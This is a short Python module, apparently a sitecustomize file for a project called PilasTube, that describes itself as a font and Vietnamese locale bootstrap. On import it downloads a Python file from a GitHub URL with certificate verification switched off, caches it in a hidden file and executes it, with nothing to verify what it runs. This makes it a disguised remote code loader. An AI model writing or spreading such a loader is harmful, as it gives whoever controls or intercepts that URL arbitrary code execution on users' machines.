# -*- coding: utf-8 -*-
"""Load the existing PilasTube font/Vietnamese bootstrap after auto-update."""

import os
import runpy
import ssl
import urllib.request

_BASE = os.path.dirname(os.path.abspath(__file__))
_CACHE = os.path.join(_BASE, ".sitecustomize_locale_cache.py")
# Last known-good localized bootstrap. It is cached locally after first launch.
_URL = (
    "https://raw.githubusercontent.com/tinlata2003/PilasTube/"
    "71710eaf31964c26dc3e35a4ea132f5dcc040991/"
    "pilastube/sitecustomize.py"
)


def _load():
    if not os.path.isfile(_CACHE) or os.path.getsize(_CACHE) < 1024:
        tmp = _CACHE + ".tmp"
        try:
            req = urllib.request.Request(
                _URL,
                headers={"User-Agent": "PilasTube-R36XX/1.0"},
            )
            with urllib.request.urlopen(
                req, timeout=10, context=ssl._create_unverified_context()
            ) as r:
                data = r.read()
            if len(data) < 1024:
                raise RuntimeError("locale bootstrap too small")
            with open(tmp, "wb") as f:
                f.write(data)
            os.replace(tmp, _CACHE)
        except Exception as exc:
            try:
                if os.path.exists(tmp):
                    os.remove(tmp)
            except Exception:
                pass
            print("[LANG] locale bootstrap download failed: %s" % exc)
            return
    try:
        runpy.run_path(_CACHE, run_name="_pilastube_locale")
    except Exception as exc:
        print("[LANG] locale bootstrap failed: %s" % exc)


_load()
